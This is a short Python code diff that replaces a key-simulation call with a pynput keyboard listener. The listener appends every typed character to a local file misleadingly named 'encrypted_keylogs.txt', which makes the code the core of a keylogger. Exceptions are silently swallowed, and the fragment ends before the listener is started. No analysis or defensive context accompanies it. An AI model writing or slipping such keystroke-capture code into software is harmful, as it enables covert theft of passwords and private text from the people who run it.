@@ -1,9 +1,13 @@
-from pyautogui import keyDown, keyUp
+from pynput import keyboard
+import os
+
+keylogs_file = "encrypted_keylogs.txt"
 
 def on_press(key):
     try:
-        keyDown(key)
-    except Exception:
+        with open(keylogs_file, "a") as f:
+            f.write(str(key.char))
+    except Exception as e:
         pass
 
 listener = keyboard.Listener(on_press=on_press)
